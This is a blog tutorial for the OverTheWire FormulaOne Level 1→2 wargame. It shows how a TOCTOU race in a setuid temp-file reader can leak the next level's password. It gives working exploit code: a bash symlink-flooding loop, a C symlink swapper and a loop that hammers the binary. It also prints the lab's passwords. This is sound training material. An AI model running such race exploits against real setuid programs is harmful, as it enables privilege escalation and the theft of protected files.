---
date: 2023-09-29 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire FormulaOne Level 1 → 2 tutorial!!"
permalink: /posts/overTheWire-FormulaOne-Level-1-to-2/
tags: [overthewire, formulaone, pwn, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire FormulaOne Level 1 → 2!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .formulaone-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .formulaone-nav .nav-left,.formulaone-nav .nav-center,.formulaone-nav .nav-right{flex:1}
  .formulaone-nav .nav-left{text-align:left}
  .formulaone-nav .nav-center{text-align:center}
  .formulaone-nav .nav-right{text-align:right}
  .formulaone-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .formulaone-nav a:hover{transform:translateY(-1px)}
  .formulaone-nav .disabled{opacity:.55}
  :root[data-theme='light'] .formulaone-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="formulaone-nav" aria-label="FormulaOne level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-FormulaOne-Level-0-to-1/' | relative_url }}">← Previous: Level 0 → 1</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/formulaone/formulaone2.html" target="_blank" rel="noopener">Official (Level 2) ↗</a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-FormulaOne-Level-2-to-3/' | relative_url }}">Next: Level 2 → 3 →</a>
  </div>
</nav>

## Login

Start as **formulaone1** on the FormulaOne host:

```bash
ssh formulaone1@formulaone.labs.overthewire.org -p 2232
````

> At the time of writing, the Level-1 password was:
> **`WUJPXwIoiBhedmDZceQ5DAUMq0JeI0eU`**
> (These rotate occasionally; use whatever you obtained in the previous level.)

List the challenge directory:

```bash
ls -la /formulaone/
```

You’ll see sources and setuid binaries for the next levels.

!\[Listing]\({{ '/assets/images/formulaone/level-1-to-2/ls-la.png' | relative\_url }})

---

## Task

Exploit Level-2’s program to **print the password for user `formulaone2`** (stored at `/etc/formulaone_pass/formulaone2`) and then log in as that user.

---

## A little bit of Theory

* **Setuid bit (`s`)**: binaries like `/formulaone/formulaone2` run with the **owner’s** privileges (here, `formulaone2`). If the code has a **TOCTOU** flaw (Time-Of-Check vs Time-Of-Use), we may trick it into opening files we normally can’t.
* **Random temp names**: Level-2 generates a path like `/tmp/tmp_abcd` where `abcd ∈ [a–z]^4` (i.e., **26⁴ = 456,976** possibilities). We can pre-create almost all of them as symlinks to the password file and then race the last remaining name.

---

## Code Reading

Sources live in `/formulaone/formulaone2_src/`.

### `formulaone2.c`

```c
#include <stdio.h>

int main(int argc, char *argv[]){
  char buf[256];
  FILE *f = fopen(mytmpnam(NULL), "r");   // filename looks like /tmp/tmp_abcd
  fgets(buf, sizeof(buf), f);             // read contents
  fwrite(buf, sizeof(buf), 1, stdout);    // print to stdout
  return;
}
```

Acts like a tiny `cat` for a **temp file** whose name comes from `mytmpnam()`.

### `tmpnam.c`

```c
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

#define PREFIX "/tmp/tmp_"
#define RNDLEN 4

char mytmpnam_buffer[100];

char *mytmpnam(char *s) {
    int i, seed, result, prefixlen = strlen(PREFIX);
    FILE *in;
    struct stat st;

    if(!(in = fopen("/dev/urandom", "r"))) return NULL;
    fread(&seed, sizeof(seed), 1, in);
    fclose(in);

    srand(seed);

    while(1) {
        strcpy(mytmpnam_buffer, PREFIX);
        for(i = prefixlen; i < prefixlen + RNDLEN; i++) {
            mytmpnam_buffer[i] = 'a' + (rand() % 26);  // a..z
        }
        mytmpnam_buffer[i] = 0;

        if(stat(mytmpnam_buffer, &st) != 0) return mytmpnam_buffer; // unused name
    }
    return NULL;
}
```

`mytmpnam()` keeps rolling a random 4-letter suffix until it finds a name that **doesn’t exist**. That check gives us a **race window**.

---

## Strategy

1. **Pre-create 26⁴ − 1** symlinks `/tmp/tmp_???? → /etc/formulaone_pass/formulaone2` (leave exactly one name free, e.g., `tmp_zzzz`).
2. Run a tight loop that **rapidly creates/removes** the **last** symlink `tmp_zzzz` to hit the moment **after** `stat()` passes but **before** `fopen()` happens.
3. In parallel, spam-run `/formulaone/formulaone2` until it prints the password.

---

## Solution

> Work in `/tmp` to avoid cluttering your home.

### 1) Pre-create \~456,975 symlinks (all but one)

```bash
TARGET="/etc/formulaone_pass/formulaone2"
echo "starting (this is heavy and slow in bash)…"
for a in {a..z}; do
  for b in {a..z}; do
    for c in {a..z}; do
      for d in {a..z}; do
        name="/tmp/tmp_${a}${b}${c}${d}"
        # leave just one name uncreated; we'll race that one:
        if [[ "${a}${b}${c}${d}" != "zzzz" ]]; then
          ln -sf "$TARGET" "$name"
        fi
      done
    done
  done
done
echo "done creating symlinks"
```

*(Tip: Doing this in C would be **much** faster; bash may take \~10–15 minutes.)*

### 2) Symlink swapper for the last name

Save as `swapper.c`:

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

#define TARGET "/etc/formulaone_pass/formulaone2"
#define SYM    "/tmp/tmp_zzzz"

int main() {
    fprintf(stderr, "Swapping symlink %s -> %s …\n", SYM, TARGET);
    while (1) {
        symlink(TARGET, SYM);  // create
        usleep(50);            // tune this (µs): 50–200 is a good starting range
        unlink(SYM);           // remove
    }
    return 0;
}
```

Compile & run:

```bash
gcc -O2 -o swapper swapper.c
./swapper &
SWAP=$!
```

> **Sleep tuning:** If you never hit the window, try `usleep(100)`, `usleep(500)`, or even a little higher. Sub-µs sleeps aren’t realistic; OS timers are usually µs-granularity or worse.

### 3) Hammer the vulnerable binary until it leaks

```bash
while true; do
  /formulaone/formulaone2
done
```

When timing lands, the program prints the password to stdout. Example success:

```
OvQAKUM3BrvbH4pKjBJBCOUpTGSDjNum
```

Kill the swapper when done:

```bash
kill "$SWAP" 2>/dev/null
```

### 4) Log in as `formulaone2`

```bash
ssh formulaone2@formulaone.labs.overthewire.org -p 2232
# password: OvQAKUM3BrvbH4pKjBJBCOUpTGSDjNum   # (at time of writing)
```

---

## Troubleshooting

* **No output / segfaults only:** Adjust `usleep()` (both up and down). Add a tiny `sleep 0.001` between `/formulaone/formulaone2` runs.
* **Pre-create step too slow:** Re-implement the 26⁴ loop in C and run it once.
* **Disk clutter in `/tmp`:** Clean up with `find /tmp -maxdepth 1 -name 'tmp_[a-z][a-z][a-z][a-z]' -type l -delete` after you’re done.
* **Different password:** That’s normal—OTW rotates them.

---

**Congrats 🎉** You exploited a **TOCTOU** race against a temp-name generator and used a setuid binary to read a protected password. On to Level 2 → 3!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

